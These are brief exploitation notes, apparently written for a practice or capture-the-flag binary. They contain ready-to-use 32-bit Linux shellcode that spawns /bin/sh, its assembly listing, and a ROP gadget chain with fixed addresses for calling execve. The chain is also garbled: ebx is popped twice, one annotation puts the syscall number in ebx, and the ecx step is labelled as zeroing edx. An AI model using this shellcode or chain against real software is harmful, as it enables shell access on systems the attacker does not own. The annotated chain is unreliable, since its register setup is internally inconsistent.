# execve ROP
### execve 32bit linux from shell-storm.org

    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    xor    %eax,%eax
    push   %eax
    push   $0x68732f2f
    push   $0x6e69622f
    mov    %esp,%ebx
    push   %eax
    push   %ebx
    mov    %esp,%ecx
    mov    $0xb,%al
    int    $0x80

## My ROP:
    0x80e4809 - pop eax ; ret
    === data on stack ====
    0xb - syscall number pops into eax
    ======================
    0x80bcc84 - pop ebx ; ret
    === data on stack ====
    leak some str addr and put it here
    ======================
    0x80bcc84 - pop ebx ; ret
    === data on stack ====
    0xb - poping the syscall number into ebx
    ======================
    0x080e71c5 - pop ecx ; ret
    === data on stack ====
    0x0 - zeroing edx because we dont really need it
    ======================
    0x0806f22a - pop edx ; ret
    === data on stack ====
    0x0 - zeroing edx because we dont really need it
    ======================
    0x08048ef6 - int 80 ; no-ret